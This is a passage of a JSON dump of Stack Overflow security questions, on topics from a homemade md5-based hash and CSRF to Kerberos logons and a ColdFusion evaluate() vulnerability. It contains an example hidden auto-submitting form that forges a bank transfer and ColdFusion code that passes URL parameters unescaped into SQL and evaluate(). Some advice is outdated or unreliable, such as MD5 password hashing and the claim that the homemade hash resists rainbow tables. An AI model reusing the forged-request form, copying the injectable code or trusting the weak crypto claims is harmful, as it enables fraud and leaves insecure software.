str_split(md5($text).md5(strlen($text)).md5($len), 5);\n    foreach($split as $key=&gt;$value)\n    {\n      $md5 = $md5.md5($value);\n    }\n    $split2 = str_split($md5);\n    foreach($split2 as $kl=&gt;$vl)\n    {\n      if($kl &lt; $len)\n      {\n        $digest = $digest.$split2[$kl];\n      }   \n    }\n    return $digest;\n  }\n} // end md7 function\n?&gt;\n</code></pre>\n\n<p>I created this function to make use of md5 and a variable length hash, I believe this reduces the chances of a collision, I have tested the examples of an MD5 collision and it does not create a collision for this function, and this function I believe is not susceptible to rainbow table attacks.</p>\n"},{"tags":["asp.net","security","iis","sharepoint2010"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":278,"score":1,"question_id":10726477,"title":"ASP.NET application gets system.unauthorizedaccessexception when accessing a network drive","body":"<p>I'm attempting to access a network drive from an ASP.NET page. Technically it's a SharePoint application page (_layouts/mycompany/mypage.aspx) but I believe the principles are the same.</p>\n\n<pre><code>string filePath = @\"\\\\companyshare\\temp\\test.txt\";\nFileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read);\n</code></pre>\n\n<p>When I hit the second line in the code above I get the error:</p>\n\n<blockquote>\n  <p>Access to the path '\\companyshare\\temp\\test.txt' is denied.</p>\n</blockquote>\n\n<p>The application pool for this site is running under a domain account (MYCOMPANY\\adminacct). MYCOMPANY\\adminacct has access to the file \\companyshare\\temp\\test.txt. I've confirmed that by logging into the server with the MYCOMPANY\\adminacct credentials and navigating to the file using the same path that is in the code.</p>\n\n<p>I'm running IIS 7.5</p>\n\n<p><strong>Questions</strong></p>\n\n<p>How come the above code is still getting access denied even though the application pool account has access to the folder and file?</p>\n\n<p>Is there a way to confirm that my code is actually trying to access that file with the credentials I believe it is using?</p>\n"},{"tags":["html","database","security","escaping"],"answer_count":4,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":643,"score":8,"question_id":3648430,"title":"Is it a bad idea to escape HTML before inserting into a database instead of upon output?","body":"<p>I've been working on a system which doesn't allow HTML formatting. The method I currently use is to escape HTML entities before they get inserted into the database. I've been told that I should insert the raw text into the database, and escape HTML entities on output.</p>\n\n<p>Other similar questions here I've seen look like for cases where HTML can still be used for formatting, so I'm asking for a case where HTML wouldn't be used at all.</p>\n"},{"tags":["ajax","security","xss"],"answer_count":9,"favorite_count":12,"up_vote_count":26,"down_vote_count":3,"view_count":3726,"score":23,"question_id":466737,"title":"Why the cross-domain Ajax is a security concern?","body":"<p>Why was it decided that using <strong>XMLHTTPRequest</strong> for doing XML calls should not do calls across the domain boundary?  You can retrieve JavaScript, images, CSS, iframes, and just about any other content I can think of from other domains. Why are the Ajax HTTP requests not allowed to cross the domain boundaries?  It seems like an odd limitation to put, considering the only way I could see it being abused, would be if someone were to inject Javascript into the page.  However, in this case, you could simply add an img, script, or iframe element to the document to get it to request the third party URL and send it to the server.  </p>\n\n<p>[Edit] </p>\n\n<p>Some of the answers point out the following reasons, let's point out the reasons they don't  create a major reason to disallow this.</p>\n\n<h2>XSRF (Cross Site Request Forgery, also known as CSRF, XSRF)</h2>\n\n<p>Your can do XSRF attacks without using this at all.  As a general rule, XMLHTTPRequest isn't used at all, simply because it's so hard to make an XMLHTTPRequest in a way that's compatible with all major browsers.  It's much easier to just add an img tag to the URL if you want them to load your URL.</p>\n\n<h2>Posting to third party site</h2>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n  $.post(\"http://some-bank.com/transfer-money.php\", \n         { amount: \"10000\", to_account: \"xxxx\" })\n&lt;/script&gt;\n</code></pre>\n\n<p>Could be accomplished with</p>\n\n<pre><code>&lt;body onload=\"document.getElementById('InvisbleForm').submit()\"\n    &lt;div style=\"display:none\"&gt;\n        &lt;form id=\"InvisbleForm\" action=\"http://some-bank.com/transfer-money.php\" method=\"POST\"&gt;\n            &lt;input type=\"hidden\" name=\"amount\" value=\"10000\"&gt;\n            &lt;input type=\"hidden\" name=\"to_account\" value=\"xxxxx\"&gt;\n        &lt;/form&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n</code></pre>\n\n<h2>JPunyon: why would you leave the vulnerability in a new feature</h2>\n\n<p>You aren't creating any more insecurities.  You are just inconveniencing developers who want to use it in a way for good.  Anybody who wants to use this feature for evil (aka awesome) could just use some other method of doing it.</p>\n\n<h2>Conclusion</h2>\n\n<p>I'm marking the answer from <strong>bobince</strong> as correct because he pointed out the critical problem.  Because XMLHTTPRequest allows you to post, with credentials (cookies) to the destination site, and read the data sent back from the site, along with sending the persons credentials, you could orchestrate some javascript that would submit a series of forms, including confirmation forms, complete with any random keys generated that were put in place to try to prevent a XSRF.  In this way, you could browse through the target site, like a bank, and the bank's webserver would be unable to tell that it wasn't just a regular user submitting all these forms.</p>\n"},{"tags":["html","security","iis"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":38,"score":-2,"question_id":12869596,"title":"Security for Account Information on Website","body":"<p>I'm completely new to this and am kind of being shoved into doing a website which does not process any transactions itself, but it does send personal information from client to a server database.</p>\n\n<p>The user will be entering their credit card # and exp. date into our database. <strong>What type of security should I be looking at on the server side? Client side?</strong> What is the complexity of implementing these security measures?</p>\n\n<p>I'm not new to websites, just to security on websites. Any help to get me started is much appreciated.</p>\n"},{"tags":["security","cpanel","remote-file-inclusion"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":41,"score":-1,"question_id":12867769,"title":"Tracing footprints on a hacked server","body":"<p>My server got hacked yesterday and I found a file name <strong>772e.php</strong> in my server. It seems someone remotely included file into my server. I searched all my access logs and did not found any trace of how this file got there. </p>\n\n<p>Any suggestions on how can I found that someone placed this file on my server and stop it from happening again. </p>\n\n<p>Main scripts on my server are wordpress, phpbb and some custom scripts.</p>\n"},{"tags":["security","sharepoint","kerberos","anonymous","spn"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12700978,"title":"kerberos anonymous logon","body":"<p>I'm trying to implement Kerberos authentication on Java to use Sharepoint 2010.<br>\nAlready made tons of configuration: SPN's, delegations, permissions, network.\nUsing org.ietf.jgss implementation of Kerberos.</p>\n\n<p>Current state is the following: IE works fine, Java app works incorrectly.</p>\n\n<p>Almost the only difference I have now is in Event Viewer\\Windows Logs\\Security.<br>\nIf I log in with Internet Explorer, it shows:</p>\n\n<blockquote>\nAn account was successfully logged on.<br/>\n    ...<br/>\n    New Logon:<br/>\n    Security ID:    COMPANYDOMAIN\\myusername<br/>\n    Account Name:       myusername<br/>\n    Account Domain:     COMPANYDOMAIN<br/>\n...<br/>\nDetailed Authentication Information:<br/>\n    Logon Process:      Kerberos<br/>\n<br/></blockquote>\n\n<p>Login with my JavaApp:</p>\n\n<blockquote>\nAn account was successfully logged on.<br/>\n    ...<br/>\n    New Logon:<br/>\n    Security ID:    ANONYMOUS LOGON<i>  ------> ???</i><br/>\n    Account Name:       myusername<br/>\n    Account Domain:     COMPANYDOMAIN.NET <i>  ------> .NET(!)</i><br/> \n...<br/>\nDetailed Authentication Information:<br/>\n    Logon Process:      Kerberos<br/>\n<br/></blockquote>\n\n<p>Using Wireshark I can see that ticket was accepted successfully at the endpoint, no difference except the size of encrypted token, even more - SharePoint does work with my java client. The question why is it working under anonymous login is different, I should switch it off somewhere. <br><br>\nThe main question is why Security ID is \"ANONYMOUS LOGON\" while the account name and domain are valid? Delegation\\Impersonation problems? But IE is working fine from the machine that is even out of Active Directory.</p>\n\n<p>I can provide additional info if needed: network traffic, SPN's, app pools, permissions, AD configuration.</p>\n\n<p>===========================</p>\n\n<p>SOLVED:\nThe problem is solved by unchecking checkbox \"Do not require Kerberos pre-authentication\" in Active Directory user account properties (tab Account, section Account options).</p>\n"},{"tags":["asp.net-mvc","security","iis","asp.net-mvc-routing","rules"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12855050,"title":"IIS .NET Authorization Rules or MVC Route rules?","body":"<p>I want to restrict access to a folder, not a page, so I thought the best approach would be using the IIS Remote Manager and add a .NET Authorization Rules entry to deny All Users to the folder in question.  </p>\n\n<p>The next step is to add authorization for Users who may be in a certain role (I'm guessing this applies to Users logged into an MVC Site, but I don't know yet).  </p>\n\n<p>In testing the first step what I discovered was the MVC 3 Application directs the visitor to a logon page.</p>\n\n<p>The first challenge I ran into, still looking to resolve.</p>\n\n<p>The original subdomain format:</p>\n\n<pre><code>subdomain1.site.com\n</code></pre>\n\n<p>The locked down folder is \"images\", but the path to the locked down folder:</p>\n\n<pre><code>subdomain1.site.com/content/images\n</code></pre>\n\n<p>When you try to access an image in the locked down folder, you get redirected to:</p>\n\n<pre><code>subdomain1.site.com/subdomain1/Account/LogOn...\n</code></pre>\n\n<p>I would expect this to be:</p>\n\n<pre><code>subdomain1.site.com/Account/LogOn...\n</code></pre>\n\n<p>I have another question posted regarding <a href=\"http://stackoverflow.com/questions/12854705/iis-7-url-rewrite-config-issue-or-mvc-route\">URL Rewrite...</a> here on StackOverFlow, not sure what the correct solution should be so I separated these questions.</p>\n\n<p>I know you can restricted a page based on logged in Users and Roles, but that only applies to the page and not files that may exist in a folder.</p>\n\n<p>My thought on this is to deny all access to the folder and then add in rules for authorized roles.  If Security works the way I think it does then when a User logs into the MVC 3 Site, they will have credentials with the assigned Roles.</p>\n\n<p>In this capacity, it should then allow them to access any restricted files in the locked down folder as long as the same Roles are mapped in the rules.</p>\n"},{"tags":["php","mysql","security","checklist"],"answer_count":5,"favorite_count":6,"up_vote_count":4,"down_vote_count":0,"view_count":1118,"score":4,"question_id":3714107,"title":"PHP/MySQL Security Checklist: The definitive practical guide","body":"<h2>This question and its answers are now out of date</h2>\n\n<p>See <a href=\"http://stackoverflow.com/questions/60174/best-way-to-prevent-sql-injection-in-php\">this question instead</a></p>\n\n<p>Please, don't use <code>mysql_*</code> functions to write new code. They are no longer maintained and the community has begun the <a href=\"http://goo.gl/KJveJ\" rel=\"nofollow\">deprecation process</a>. See the <em><a href=\"http://goo.gl/GPmFd\" rel=\"nofollow\">red box</a></em>? Instead you should learn about <a href=\"http://goo.gl/vn8zQ\" rel=\"nofollow\">prepared statements</a> and use either <a href=\"http://php.net/pdo\" rel=\"nofollow\">PDO</a> or <a href=\"http://php.net/mysqli\" rel=\"nofollow\">MySQLi</a>. If you can't decide which, <a href=\"http://goo.gl/3gqF9\" rel=\"nofollow\">this article</a> will help you. If you pick PDO, <a href=\"http://goo.gl/vFWnC\" rel=\"nofollow\">here is good tutorial</a>. Also see <a href=\"http://goo.gl/ycnmO\" rel=\"nofollow\">Why shouldn't I use <code>mysql</code> functions in PHP?</a></p>\n\n<hr>\n\n<p>After seeing <a href=\"http://stackoverflow.com/questions/315911/git-for-beginners-the-definitive-practical-guide\">this awesome guide on Stack</a> and needing a practical <code>PHP/MySQL</code> security checklist in-house, I have decided to pay homage to the original guide.</p>\n\n<p>What I need is a <strong>practical</strong> security checklist for <code>PHP</code> and <code>MySQL</code>. The contents here can function as the checklist, while the answers should function as the guides.</p>\n\n<p>By <em>practical</em> I mean that each answer should avoid superfluous security theoretics and focus on real results. Most of us don't need to know about <code>RFC3174</code> when you're suggesting to secure passwords using a <code>SHA-1</code> hash. We just want to make passwords secure.</p>\n\n<p>I will go through the entries from time to time and tidy them up so they have a consistent look and feel and it's easy to scan the list. Feel free to follow a simple \"header - brief explanation - list of instructions - gotchas and extra info\" template. I'll also link to the entries from the bullet list below so it's easy to find them later.</p>\n\n<p><strong>Procedural note</strong>: PLEASE pick <strong>one and only one</strong> of the below topics and answer it clearly and concisely. Don't try to jam a bunch of information into one answer. Don't just link to other resources - cut and paste with attribution if copyright allows, otherwise learn it and explain it in your own words (that is, don't make people leave this page to learn a task). Please comment on, or edit, an already existing answer unless your explanation is very different and you think the community is better served with a different explanation.</p>\n\n<h1>PHP</h1>\n\n<hr>\n\n<p>Validate user input<br/>\nGuard your file system<br />\nGuard your sessions<br />\nGuard against XSS vulnerabilities<br />\nGuard against invalid <code>POST</code>s<br />\nGuard against CRSF<br />\n<a href=\"http://stackoverflow.com/questions/3714107/php-mysql-security-checklist-the-definitive-practical-guide/3714225#3714225\">Stop using <code>$_REQUEST</code></a><br />\nStop using <code>register_globals</code></p>\n\n<p><br /></p>\n\n<h1>MySQL</h1>\n\n<hr>\n\n<h2>Avoid SQL injection</h2>\n\n<p><a href=\"http://stackoverflow.com/questions/3714107/php-mysql-security-checklist-the-definitive-practical-guide/3714241#3714241\">Use <code>mysql_real_escape_string</code> to protect against <code>SQL</code> injection</a></p>\n\n<p><br />\n<strong>Keep in mind that the above list is only a starter</strong>, and that many of the above topics will likely become sub-headers and are too broad to write on. Try to distill something smaller like \"Stop using <code>register_globals</code>\" rather than, say, trying to write an answer on XSS as a whole. Over time I hope everyone can add many more things.</p>\n"},{"tags":["database","security","encryption","couchdb"],"answer_count":7,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":730,"score":7,"question_id":4961603,"title":"What's the best way to store and yet still index encrypted customer data?","body":"<p>What's the best way to store and yet still index encrypted customer\ndata?</p>\n\n<p>I'm building an application that needs to store sensitive information,\nbut it still needs to be searchable on a certain level. But ideally it should also be encrypted, so that a hacker who gets into the server can't read it.</p>\n\n<p>What are some best practices and approaches for storing sensitive data that needs to be searchable?\nThis data can't be as opaque as a password hash. It needs to be\nviewable, sortable, and searchable by authorized people.</p>\n\n<p>The data may be stored in a relational database or a document store like\nCouchDB.</p>\n\n<p>I'm perfectly willing to make certain compromises. For example, I'm willing to leave some data attributes unencrypted to make them indexable, but keep the main body of stuff like emails stored as encrypted blobs. Also, I was thinking of extracting non-stop-words from the body of emails and putting them in random order in a field before encrypting the body, and then feed that field to a search indexer, although I'm not sure whether this provides any real degree of security.</p>\n\n<p>Thanks for any wisdom or suggestions you guys can offer.</p>\n\n<p>If what I'm wishing for is impractical and I should just concentrate on securing the server, let me know.</p>\n"},{"tags":["linux","security","find","owasp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12867070,"title":"Linux text editor temp files search","body":"<p>I remember reading where it is bad security practice to edit files directly on the server because it may create hidden temporary files. Is it possible to search for these files? I was thinking of find / -name .*, but that returns \"paths must precede expression: ..\" and do not know if that will include all files possibly created by elvis or nano.</p>\n"},{"tags":["java","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12865429,"title":"How specify platform independent paths in java.security and policy files?","body":"<p>I want to ship a single security policy file to our customers - for both Linux and Windows. In the java.security file, I add a line to point to our file, but due to path differences I have to specify it differently for Windows and Linux</p>\n\n<pre><code>policy.url.3=file:/${our.home}/lib/OurSecurity.policy  # Windows\npolicy.url.3=file:${our.home}/lib/OurSecurity.policy   # Linux\n</code></pre>\n\n<p>That first \"/\" after the \"file:\" is needed on windows since the variable our.home is defined as \"C:\\foo\".  I have the same problem in the policy file itself:</p>\n\n<pre><code>grant codeBase \"file:/${our.home}/-\"   // Windows\ngrant codeBase \"file:${our.home}/-\"    // Linux\n</code></pre>\n\n<p>I'm especially looking for a clever way to specify the codeBase in a platform independent way.  By the way, redefining our.home is not really an option, as it's needed in a FilePermission clause.</p>\n"},{"tags":["java","android","security"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":412,"score":3,"question_id":9130599,"title":"How to change the snapshot shown by recent apps list?","body":"<p>In the newer versions of Android (> 3.0) there is an onscreen button that \nwill display a list of the recent apps with their names and snapshots. \nEven though my app itself is password protected, this overview might \nshow sensitive data in that snapshot. So is there any way to force a \ncertain image (like a logo) to be shown rather than let the OS decide? </p>\n"},{"tags":["java","android","security","logging","android-activity"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":286,"score":0,"question_id":4901261,"title":"Use Call Activity without logging in recent calls","body":"<p>I have an application that uses call activity to call people. However, when the call is made, the number will be logged to recent call list, and I don't want this to happen. </p>\n\n<p>What would be the best way for the phone to not to log the calls made?</p>\n"},{"tags":["java","android","security","android-manifest"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":406,"score":1,"question_id":11120176,"title":"Handle Recent apps click and home press in android","body":"<p>I am making an app for kids where once you're inside the app you can't exit without password which I am asking for in the menu. Now I want if inside app I press home button in the app it should remain on same activity.  I searched a lot but everywhere the solution is adding filters in manifest but those are not working well for me. I want my activity to be removed from launcher when app exits and again ask if starts application.</p>\n\n<p>And for the same app if i press recent app button and one of those is clicked by the kid also the app should be in same activity or if there any way to block the recent app button.</p>\n\n<p>I tried this</p>\n\n<pre><code>&lt;activity\n    android:label=\"@string/app_name\"\n    android:launchMode=\"singleInstance\"\n    android:name=\".MyActivity\"\n    android:screenOrientation=\"landscape\"\n    android:excludeFromRecents=\"true\"\n    android:taskAffinity=\"\"\n    android:stateNotNeeded=\"true\" &gt;\n    &lt;intent-filter &gt;\n        &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n         &lt;category android:name=\"android.intent.category.HOME\" /&gt;\n         &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</code></pre>\n"},{"tags":["security","session","e-commerce","bots"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12587513,"title":"Why shouldn't bots be allowed session ids?","body":"<p>I am trying to write a script that will let me identify bots that are trying to flood my oscommerce site, but some bots change their IPs frequently so I cant really use the IP to ban them. </p>\n\n<p>I was thinking may be if I enable sessions for bots, I could use the session IDs to block the bot. </p>\n\n<p>I did some research on this and found that enabling sessions for bots is not recommended but I am still not sure why? </p>\n"},{"tags":["security","ibm-midrange","profile-token"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12830341,"title":"How can I double check my use of Profile Tokens on the IBM iSeries?","body":"<p>I am using the IBM security APIs (QSYGENPT, QSYRMVPT, etc) to create profile tokens on an iSeries system when users authenticate in order to start jobs as the user.  There is a fixed limit of 2,000,000 such tokens that can be created on the system, so one needs be careful to delete any token created when it's no longer needed.  Failing to do so would constitute a leak of a critical system resource.</p>\n\n<p>However, I can find no way on the system to report a current total count of the tokens, list tokens created by a particular job and/or user, or anything like that, so I have no way of validating that my program is not leaking tokens.</p>\n\n<p>So far, the only way seems to be to use the system's audit journal entries and tediously match up token create/delete audit entries.  Ugh!  </p>\n\n<p>Can anyone offer any better ideas?</p>\n"},{"tags":["javascript","jquery","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12864537,"title":"Javascript Security Concern","body":"<p>In my previous question: \n<a href=\"http://stackoverflow.com/questions/12861419/securing-javascript-game-timing\">Securing javascript game timing</a></p>\n\n<p>... it became clear that client-side timing in a Javascript/Canvas game simply won't be secure. I know the mantra about not trusting the client - that is what is causing my struggle in the first place. :-)</p>\n\n<p>So, if I do move all timing to the server and just deal with it, here is a follow-up question. The game obviously needs to be completed before submitting it. As the game puzzle is all Javascript, this introduces the problem of manipulating the client-side code to fake the completion of the game.</p>\n\n<p>I've created the game JS code in a separate class file. If I instantiate the game as such:</p>\n\n<pre><code>var game;\n$document.ready(function(){\n  game = new Game();\n});\n</code></pre>\n\n<p>... then, I can access the 'game' object and all of its methods and variables via the console. </p>\n\n<p>However, if I do:</p>\n\n<pre><code>$document.ready(function(){\n  var game = new Game();\n});\n</code></pre>\n\n<p>... then I cannot access the 'game' object through the console. This seems to help, but is there something I don't know - can this object still be accessed in some way I don't know about or is making it a private var in that function a little more secure?</p>\n\n<p>Thanks!</p>\n"},{"tags":["javascript","security","node.js","web-security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":689,"score":1,"question_id":8610222,"title":"How to prevent DOS attacks on my http server which written in node.js?","body":"<p>using node.js, the net module for building a tcp server which can hande http requests.</p>\n\n<p>I would like to prevent dos attacks so what I have done is somthing like this:</p>\n\n<pre><code>if (status.numOfCurrentRequests + 1 &gt;= MAX_NUM_OF_CONNECTIONS) {\n    socket.end();\n    return; \n}\n</code></pre>\n\n<p>I was wondering if it is better to use :</p>\n\n<pre><code>socket.destroy();\n</code></pre>\n\n<p>from the API :</p>\n\n<blockquote>\n  <p>socket.destroy() # Ensures that no more I/O activity happens on this\n  socket. Only necessary in case of errors (parse error or so).</p>\n</blockquote>\n\n<p>what are the differences and benefits? </p>\n"},{"tags":["security","application","player","soundcloud","locked"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12863990,"title":"Soundcloud track embedded player in app","body":"<p>Is there a way to lock an embedded player for APP thru the API that is limited to one track already hosted on SoundCloud without the possibility to download it. So people that download the player client can only listen to this track?</p>\n"},{"tags":["security","coldfusion","coldfusion-9","evaluate"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":118,"score":1,"question_id":12858136,"title":"Alternatives to Evaluate","body":"<p>An audit has shown up a vulnerability in our use of evaluate as it allows arbitrary code execution. Has anyone got an alternative? Example below. We're running CF9.</p>\n\n<pre><code>&lt;cfquery name=\"getvalue\" datasource=\"#application.ds#\"&gt;\n   SELECT     #url.column#\n   FROM         dbo.tbl#url.table#\n   WHERE     (int#url.table#Id = &lt;CFQUERYPARAM Value=\"#url.Id#\"&gt;)\n&lt;/cfquery&gt;\n\n&lt;cfif url.rowtype eq \"text\"&gt;\n    &lt;cfoutput&gt;\n    &lt;input type=\"text\" id=\"focus#url.table##url.column##url.Id#\" \n        name=\"#url.table##url.column##url.Id#\" \n        value=\"#evaluate('getvalue.#url.column#')#\" \n        class=\"inputtext\"\n        onblur=\"updateeditvalue('#url.rowtype#','#url.table#','#url.column#',#url.Id#\n                    ,escape(this.form.#url.table##url.column##url.Id#.value))\" \n        style=\"height:20px;width:500px;\"&gt;\n    &lt;/cfoutput&gt;\n&lt;cfelseif url.rowtype eq \"textarea\"&gt;\n     &lt;cfoutput&gt;\n     &lt;textarea id=\"focus#url.table##url.column##url.Id#\" \n        name=\"#url.table##url.column##url.Id#\" \n        class=\"inputtext\" style=\"height:20px;width:500px;\"\n        onblur=\"updateeditvalue('#url.rowtype#','#url.table#','#url.column#',#url.Id#\n                     , escape(this.form.#url.table##url.column##url.Id#.value))\"&gt;\n          #evaluate('getvalue.#url.column#')#\n    &lt;/textarea&gt;\n    &lt;/cfoutput&gt;\n&lt;/cfif&gt;\n</code></pre>\n"},{"tags":["java","security","java-ee-6","jboss7.x"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":45,"score":0,"question_id":12862549,"title":"How can I secure a webapp with basic authentication in specific jboss environment?","body":"<p>I have a webapp (war) and it should run in different environments (local, dev, etc...). The DEV environment is internet accessible.</p>\n\n<p>How can I protect access in this environment? I sould not change the WAR file for different environments. A basic authentication with users &amp; passwords in a textfile is enough. </p>\n\n<p>(The Webapp runs in JBoss AS 7.)</p>\n"},{"tags":["ajax","web-services","security","csrf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12843496,"title":"Protect Web API from unauthorized applications","body":"<p>I am working on a web page that uses a lot of AJAX to communicate with the server. The server, in turn, has an extensive REST/JSON API exposing the different operations called by the web client.</p>\n\n<p>This web site is used by both anonymous and authenticated users. As you might expect, the web service calls issued by authenticated users require authentication, and are thus protected from unauthorized users or applications.</p>\n\n<p>However, the web site has a lot of features that require no authentication, and some of these make use of anonymous web services. The only way I am using to prevent outsiders from calling this web services is by using a <a href=\"http://en.wikipedia.org/wiki/Cross-site_request_forgery#Prevention\" rel=\"nofollow\">CSRF token</a>. I know, the CSRF token is not very useful in this regard... with some time in hand, you can figure out how to consume the web services even if they use a CSRF token.</p>\n\n<p>Of course, you can use a CAPTCHA to prevent applications or bots from autonomously using your web service. However, any human will be able to use it.</p>\n\n<p>Sharing a secret key between client and server, on the other side, would be useless. This, because of the ability of any outsider to read it from the web page source code.</p>\n\n<p><strong>I would like to make these web services as difficult to invoke as posible to any 3rd party application</strong>. What would you do besides using the CSRF token? It sounds a little stupid, but hey, maybe it is stupid and I am just losing my time.</p>\n\n<p><em>Note: given this application uses a browser and not an \"executable\" as the client, <a href=\"http://stackoverflow.com/questions/2066107/web-api-security\">this question</a> is irrelevant to the discussion. I cannot use a secret between server and client (not to my knowledge, at least)</em></p>\n"},{"tags":["php","javascript","security"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12861419,"title":"Securing javascript game timing","body":"<p>I'm creating a canvas-based game that has an important timing element to it. Upon completion of the game, the user's completion time is to be sent to PHP/MySQL on the server for comparison with other players. </p>\n\n<p>Server-side timing (i.e. begin request time to submit request time) seems like it could introduce load times as affecting the user's actual time and therefore inefficient in this case. </p>\n\n<p>What I'm having trouble with is determining a way to assure that the time sent is legitimate. How can I stop someone from using their console and editing the client-side code in such a way as to submit a false time?</p>\n\n<p>Any help would be greatly appreciated.</p>\n"},{"tags":["asp.net","sql-server","security","permissions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12856937,"title":"Efficient Granular SecurityPermissions or (ACL)","body":"<p>we are looking into ripping out a inefficient architecture for defining security in our asp.net 4 webforms intranet. </p>\n\n<p>Our application allows definition of Permissions content and content areas. Things like Fred Bloggs has permission to edit documentb which lives in The folder(section) Sales. With the Resultant permission for Fred Bloggs being built up from the groups he belongs to and any specific permissions he has been granted or revoked from on that document or folder etc.</p>\n\n<p>Are there any nuget packages or resources out there which define the most efficient pattern for implementing Access Control Lists</p>\n\n<p>Cheers\nTim</p>\n"},{"tags":["android","security","android-resources"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":105,"score":2,"question_id":12465328,"title":"Where to store sensitive global information such as API keys in Android application?","body":"<p>I need to store some sensitive information in an Android application.  If I put it in a resource file, it appears that it is trivial for another app to be able to browse and read that file simply by using <a href=\"http://developer.android.com/reference/android/content/pm/PackageManager.html#getResourcesForApplication%28java.lang.String%29\" rel=\"nofollow\">PackageManager.getResourcesForApplication()</a>.</p>\n\n<p>Where is the correct place to put information like this that we don't want people to be able to easily snoop?</p>\n\n<p>Should it be in a compiled java file?  Or are classfiles also easily readable?  Also, if they're in java files, is it possible to reference them from XML files that need them (eg. for the google maps api key)?</p>\n"},{"tags":["php","mysql","security"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":402,"score":2,"question_id":8388536,"title":"Storing password in database and making admin panel secure","body":"<p>I am working on a website which is having Admin panel along with the website. </p>\n\n<p>Website Root Folder: <code>/htdocs</code></p>\n\n<p>Other public content of the website is in <code>/htdocs</code> folder only.</p>\n\n<p>Admin website folder: <code>/htdocs/admin</code></p>\n\n<p><strong>My Question:</strong> What are the things I need to do to make sure that my admin panel (or website) is secure from attacks?</p>\n\n<p>These are the things I am doing:</p>\n\n<ol>\n<li>Every file in <code>/htdocs/admin</code> folder is set as permission: 444\n(<code>r--r--r--</code>) of Linux.</li>\n<li><code>adminLogin.php</code> file in admin folder is using POST method to send\nthe credentials to the <code>validateCredentials.php</code> which will direct\nto <code>adminHome.php</code> upon correct username and password. The following session variable is set (along with others) on a successful login: <code>$_SESSION['usertype'] = \"admin\";</code></li>\n<li>All other files in admin folder have a check at the top of the file\nfor a valid admin SESSION variable. If there is no session variable,\nthen page will redirect to adminLogin.php</li>\n<li>Password of administrator is stored as a MD5 hash in\n<code>admin_login_details</code> table. This table is in the same database as the whole\nof the site. I got <a href=\"http://stackoverflow.com/q/1054022/722531\">this</a> question to make password storing even more secure.</li>\n<li>While verifying the password from the <code>admin_login_details</code> table, the entered\npassword is first passed to mysql_real_escape_string() and then used -- to\nprevent SQL Injection.</li>\n</ol>\n\n<p>What else is needed? Are the above points correct? If there anything which is potential security concern? </p>\n\n<p>Please add more points if required. </p>\n\n<p>I am using PHP, MySQL, Apache on CentOS server. </p>\n"},{"tags":["java","security","logging","fortify360"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":124,"score":2,"question_id":12784707,"title":"log forging fortify fix","body":"<p>I am using Fortify SCA to find the security issues in my application (as a university homework). I have encountered some 'Log Forging' issues which I am not able to get rid off.</p>\n\n<p>Basically, I log some values that come as user input from a web interface:</p>\n\n<pre><code>logger.warn(\"current id not valid - \" + bean.getRecordId()));\n</code></pre>\n\n<p>and Fortify reports this as a log forging issue, because the <em>getRecordId()</em> returns an user input.</p>\n\n<p>I have followed this <a href=\"http://www.jtmelton.com/2010/09/21/preventing-log-forging-in-java/\" rel=\"nofollow\">article</a>, and I am replacing the 'new line' with space, but the issue is still reported</p>\n\n<pre><code>logger.warn(\"current id not valid - \" + Util.replaceNewLine(bean.getRecordId()));\n</code></pre>\n\n<p>Can anyone suggest a way to fix this issue?</p>\n"},{"tags":["javascript","jquery","security","xss"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12831002,"title":"XSS - Send data to the source server of a script?","body":"<p>I am writing a JavaScript application where I plan on host the code on a CDN.  Now I plan to include this code to my clients' sites. However, I have a problem, I want to use AJAX to communicate between the client and the server.  Now, from my understanding of XSS, this is not possible.</p>\n\n<p>Ex:</p>\n\n<ol>\n<li>User visits site.com, where a script tag's source is pointing to a file on cdn.somedomain.com</li>\n<li>The script on cdn.somedomain.com fires an event.</li>\n<li>This event will communicate with a PHP.  I know it is possible for the script from cdn.somedomain.com to request documents on site.com.  However, is it possible to send data back to a PHP file on 